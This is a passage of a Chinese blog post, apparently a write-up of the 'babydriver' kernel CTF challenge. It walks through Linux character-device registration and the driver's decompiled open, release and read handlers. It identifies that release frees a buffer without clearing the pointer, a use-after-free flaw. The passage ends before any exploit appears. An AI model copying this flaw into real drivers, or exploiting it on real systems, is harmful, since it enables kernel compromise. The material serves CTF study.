class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">  <span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">  <span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">  <span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">  <span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">  <span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">  <span class="type">int</span> (*iopoll)(<span class="keyword">struct</span> kiocb *kiocb, <span class="type">bool</span> spin);</span><br><span class="line">  <span class="type">int</span> (*iterate) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">  <span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">  <span class="type">__poll_t</span> (*poll) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line">  <span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">  <span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">  <span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line">  <span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">  <span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">  <span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">  <span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">  <span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">  <span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">  <span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">  <span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">  <span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">  <span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">  <span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">  <span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line">  <span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">        <span class="type">loff_t</span> len);</span><br><span class="line">  <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">  <span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line">      <span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">  <span class="type">loff_t</span> (*remap_file_range)(<span class="keyword">struct</span> file *file_in, <span class="type">loff_t</span> pos_in,</span><br><span class="line">           <span class="keyword">struct</span> file *file_out, <span class="type">loff_t</span> pos_out,</span><br><span class="line">           <span class="type">loff_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> remap_flags);</span><br><span class="line">  <span class="type">int</span> (*fadvise)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>但在这道题中我们只会用到其中的一小部分，即 <code>/baby(open|release|read|write|ioctl)/</code>。</p>
<blockquote>
<p>struct file_operations 中的 owner 指针是必须指向当前内核模块的指针，可以使用宏定义 <code>THIS_MODULE</code> 来获取该指针。</p>
</blockquote>
<p>当 cdev 结构体初始化完成后，最后的一步就是使用 <code>cdev_add</code> 告诉内核该设备的设备号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdev_add(&amp;cdev_0, babydev_no, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>其中，<code>cdev_add</code> 函数声明如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cdev_add() - add a char device to the system</span></span><br><span class="line"><span class="comment"> * @p: the cdev structure for the device</span></span><br><span class="line"><span class="comment"> * @dev: the first device number for which this device is responsible</span></span><br><span class="line"><span class="comment"> * @count: the number of consecutive minor numbers corresponding to this</span></span><br><span class="line"><span class="comment"> *         device</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * cdev_add() adds the device represented by @p to the system, making it</span></span><br><span class="line"><span class="comment"> * live immediately.  A negative error code is returned on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *p, <span class="type">dev_t</span> dev, <span class="type">unsigned</span> count)</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，一旦 <code>cdev_add</code> 函数执行完成，则当前 cdev 设备<strong>立即处于活动状态</strong>，其<strong>操作可以立即被内核调用</strong>。因此在编写驱动程序时，务必保证在驱动程序完全准备好处理设备上的操作之后，最后再来调用 <code>cdev_add</code>。</p>
<h5 id="将设备注册进-sysfs"><a href="#将设备注册进-sysfs" class="headerlink" title="将设备注册进 sysfs"></a>将设备注册进 sysfs</h5><p>当驱动模块已经将 cdev 注册进内核后，该函数将会执行以下代码，来将当前设备的设备结点注册进 sysfs 中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">babydev_class = class_create(THIS_MODULE, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">device_create(babydev_class, <span class="number">0</span>, babydev_no, <span class="number">0</span>, <span class="string">&quot;babydev&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>其中，函数 <code>class_create</code> 和 <code>device_create</code> 的声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is a #define to keep the compiler from merging different</span></span><br><span class="line"><span class="comment"> * instances of the __key variable */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> class_create(owner, name)    \</span></span><br><span class="line"><span class="meta">(&#123;            \</span></span><br><span class="line"><span class="meta">  static struct lock_class_key __key;  \</span></span><br><span class="line"><span class="meta">  __class_create(owner, name, &amp;__key);  \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * class_create - create a struct class structure</span></span><br><span class="line"><span class="comment"> * @owner: pointer to the module that is to &quot;own&quot; this struct class</span></span><br><span class="line"><span class="comment"> * @name: pointer to a string for the name of this class.</span></span><br><span class="line"><span class="comment"> * @key: the lock_class_key for this class; used by mutex lock debugging</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is used to create a struct class pointer that can then be used</span></span><br><span class="line"><span class="comment"> * in calls to device_create().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns &amp;struct class pointer on success, or ERR_PTR() on error.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note, the pointer created here is to be destroyed when finished by</span></span><br><span class="line"><span class="comment"> * making a call to class_destroy().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *__<span class="title">class_create</span>(<span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">name</span>,</span></span><br><span class="line"><span class="class">           <span class="keyword">struct</span> <span class="title">lock_class_key</span> *<span class="title">key</span>)</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">/**</span></span><br><span class="line"><span class="class"> * <span class="title">device_create</span> - <span class="title">creates</span> <span class="title">a</span> <span class="title">device</span> <span class="title">and</span> <span class="title">registers</span> <span class="title">it</span> <span class="title">with</span> <span class="title">sysfs</span></span></span><br><span class="line"><span class="class"> * @<span class="keyword">class</span>:</span> pointer to the <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> <span class="title">that</span> <span class="title">this</span> <span class="title">device</span> <span class="title">should</span> <span class="title">be</span> <span class="title">registered</span> <span class="title">to</span></span></span><br><span class="line"><span class="class"> * @<span class="title">parent</span>:</span> pointer to the parent <span class="class"><span class="keyword">struct</span> <span class="title">device</span> <span class="title">of</span> <span class="title">this</span> <span class="title">new</span> <span class="title">device</span>, <span class="title">if</span> <span class="title">any</span></span></span><br><span class="line"><span class="class"> * @<span class="title">devt</span>:</span> the <span class="type">dev_t</span> <span class="keyword">for</span> the <span class="type">char</span> device to be added</span><br><span class="line"> * @drvdata: the data to be added to the device <span class="keyword">for</span> callbacks</span><br><span class="line"> * @fmt: <span class="built_in">string</span> <span class="keyword">for</span> the device<span class="number">&#x27;</span>s name</span><br><span class="line"> *</span><br><span class="line"> * This function can be used by <span class="type">char</span> device classes.  A <span class="class"><span class="keyword">struct</span> <span class="title">device</span></span></span><br><span class="line"><span class="class"> * <span class="title">will</span> <span class="title">be</span> <span class="title">created</span> <span class="title">in</span> <span class="title">sysfs</span>, <span class="title">registered</span> <span class="title">to</span> <span class="title">the</span> <span class="title">specified</span> <span class="title">class</span>.</span></span><br><span class="line"><span class="class"> *</span></span><br><span class="line"><span class="class"> * <span class="title">A</span> &quot;<span class="title">dev</span>&quot; <span class="title">file</span> <span class="title">will</span> <span class="title">be</span> <span class="title">created</span>, <span class="title">showing</span> <span class="title">the</span> <span class="title">dev_t</span> <span class="title">for</span> <span class="title">the</span> <span class="title">device</span>, <span class="title">if</span></span></span><br><span class="line"><span class="class"> * <span class="title">the</span> <span class="title">dev_t</span> <span class="title">is</span> <span class="title">not</span> 0,0.</span></span><br><span class="line"><span class="class"> * <span class="title">If</span> <span class="title">a</span> <span class="title">pointer</span> <span class="title">to</span> <span class="title">a</span> <span class="title">parent</span> <span class="keyword">struct</span> <span class="title">device</span> <span class="title">is</span> <span class="title">passed</span> <span class="title">in</span>, <span class="title">the</span> <span class="title">newly</span> <span class="title">created</span></span></span><br><span class="line"><span class="class"> * <span class="keyword">struct</span> <span class="title">device</span> <span class="title">will</span> <span class="title">be</span> <span class="title">a</span> <span class="title">child</span> <span class="title">of</span> <span class="title">that</span> <span class="title">device</span> <span class="title">in</span> <span class="title">sysfs</span>.</span></span><br><span class="line"><span class="class"> * <span class="title">The</span> <span class="title">pointer</span> <span class="title">to</span> <span class="title">the</span> <span class="keyword">struct</span> <span class="title">device</span> <span class="title">will</span> <span class="title">be</span> <span class="title">returned</span> <span class="title">from</span> <span class="title">the</span> <span class="title">call</span>.</span></span><br><span class="line"><span class="class"> * <span class="title">Any</span> <span class="title">further</span> <span class="title">sysfs</span> <span class="title">files</span> <span class="title">that</span> <span class="title">might</span> <span class="title">be</span> <span class="title">required</span> <span class="title">can</span> <span class="title">be</span> <span class="title">created</span> <span class="title">using</span> <span class="title">this</span></span></span><br><span class="line"><span class="class"> * <span class="title">pointer</span>.</span></span><br><span class="line"><span class="class"> *</span></span><br><span class="line"><span class="class"> * <span class="title">Returns</span> &amp;<span class="keyword">struct</span> <span class="title">device</span> <span class="title">pointer</span> <span class="title">on</span> <span class="title">success</span>, <span class="title">or</span> <span class="title">ERR_PTR</span>() <span class="title">on</span> <span class="title">error</span>.</span></span><br><span class="line"><span class="class"> *</span></span><br><span class="line"><span class="class"> * <span class="title">Note</span>:</span> the <span class="keyword">struct</span> class passed to this function must have previously</span><br><span class="line"> * been created with a call to <span class="title function_">class_create</span><span class="params">()</span>.</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">struct</span> device *<span class="title function_">device_create</span><span class="params">(<span class="keyword">struct</span> class *class, <span class="keyword">struct</span> device *parent,</span></span><br><span class="line"><span class="params">           <span class="type">dev_t</span> devt, <span class="type">void</span> *drvdata, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br></pre></td></tr></table></figure>

<p>初始时，init 函数通过调用 <code>class_create</code> 函数创建一个 <code>class</code> 类型的<strong>类</strong>，创建好后的<strong>类</strong>存放于sysfs下面，可以在 <code>/sys/class</code>中找到。</p>
<p>之后函数调用 <code>device_create</code> 函数，动态建立<strong>逻辑设备</strong>，对新逻辑设备进行初始化；同时还将其与第一个参数所对应的<strong>逻辑类</strong>相关联，并将此逻辑设备加到linux内核系统的设备驱动程序模型中。这样，函数会自动在 <code>/sys/devices/virtual</code> 目录下创建新的逻辑设备目录，并在 <code>/dev</code> 目录下创建与<strong>逻辑类</strong>对应的设备文件。</p>
<p>最终实现效果就是，我们便可以在 <code>/dev</code> 中看到该设备。</p>
<h5 id="init-函数小结"><a href="#init-函数小结" class="headerlink" title="init 函数小结"></a>init 函数小结</h5><p>综上，<code>babydriver_init</code> 函数主要做了几件事：</p>
<ol>
<li>向内核申请一个空闲的设备号</li>
<li>声明一个 cdev 结构体，初始化并绑定设备号</li>
<li>创建新的 struct class，并将该设备号所对应的设备注册进 sysfs</li>
</ol>
<h4 id="babydriver-exit"><a href="#babydriver-exit" class="headerlink" title="babydriver_exit"></a>babydriver_exit</h4><p>理解完 init 函数后，理解 exit 函数的逻辑就相当的简单——把该释放的数据结构全部释放。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">babydriver_exit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h4><p>该函数代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>babyopen 函数在内核中创建了一个 <code>babydev_struct</code> 的结构体，其中包含了一个 <code>device_buf</code> 指针以及一个 <code>device_buf_len</code>成员变量。</p>
<p>需要注意的是，<code>kmem_cache_alloc_trace</code> 函数分配内存的逻辑与 <code>kmalloc</code>类似，笔者怀疑反汇编出来的代码应该是调用 <code>kmalloc</code> 函数优化内敛后的效果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * kmalloc - allocate memory</span></span><br><span class="line"><span class="comment"> * @size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * kmalloc is the normal method of allocating memory</span></span><br><span class="line"><span class="comment"> * for objects smaller than page size in the kernel.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The allocated object address is aligned to at least ARCH_KMALLOC_MINALIGN</span></span><br><span class="line"><span class="comment"> * bytes. For @size of power of two bytes, the alignment is also guaranteed</span></span><br><span class="line"><span class="comment"> * to be at least to the size.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The @flags argument may be one of the GFP flags defined at</span></span><br><span class="line"><span class="comment"> * include/linux/gfp.h and described at</span></span><br><span class="line"><span class="comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The recommended usage of the @flags is described at</span></span><br><span class="line"><span class="comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Below is a brief outline of the most useful GFP flags</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_KERNEL</span></span><br><span class="line"><span class="comment"> *  Allocate normal kernel ram. May sleep.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_NOWAIT</span></span><br><span class="line"><span class="comment"> *  Allocation will not sleep.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_ATOMIC</span></span><br><span class="line"><span class="comment"> *  Allocation will not sleep.  May use emergency pools.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_HIGHUSER</span></span><br><span class="line"><span class="comment"> *  Allocate memory from high memory on behalf of user.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Also it is possible to set different flags by OR&#x27;ing</span></span><br><span class="line"><span class="comment"> * in one or more of the following additional @flags:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_HIGH</span></span><br><span class="line"><span class="comment"> *  This allocation has high priority and may use emergency pools.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_NOFAIL</span></span><br><span class="line"><span class="comment"> *  Indicate that this allocation is in no way allowed to fail</span></span><br><span class="line"><span class="comment"> *  (think twice before using).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_NORETRY</span></span><br><span class="line"><span class="comment"> *  If memory is not immediately available,</span></span><br><span class="line"><span class="comment"> *  then give up at once.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_NOWARN</span></span><br><span class="line"><span class="comment"> *  If allocation fails, don&#x27;t issue any warnings.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %__GFP_RETRY_MAYFAIL</span></span><br><span class="line"><span class="comment"> *  Try really hard to succeed the allocation but fail</span></span><br><span class="line"><span class="comment"> *  eventually.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *<span class="title function_">kmalloc</span><span class="params">(<span class="type">size_t</span> size, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">      <span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">    index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!index)</span><br><span class="line">      <span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">        kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">        flags, size);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h4><p>babyrelease 函数的逻辑较为简单，这里只是简单的将 babydev_struct.device_buf 释放掉。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但这里需要注意的是，尽管这里释放了指针所指向的内核空间，但 <strong>在释放完成后，该函数既没有对<code>device_buf</code>指针置空，也没有设置 <code>device_buf_len</code> 为0</strong> 。</p>
<h4 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h4><p>babyread 函数的 IDA 反汇编效果存在错误，这是笔者根据汇编代码修正后的效果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; length )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_to_user(buffer, babydev_struct.device_buf, length);</span><br><span class="line">    result = length;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>babyread 函数将在判断完当前 device_buf 是否为空之后，将 device_buf 上的内存拷贝至用户空间的 buffer 内存。</p>
<h4 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h4><p>babywrite 功能与 babyread 类似，将用户空间的 buffer 内存上的数据拷贝进内核空间的 device_buf 上，此处不再赘述。该函数修正后的反编译代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span 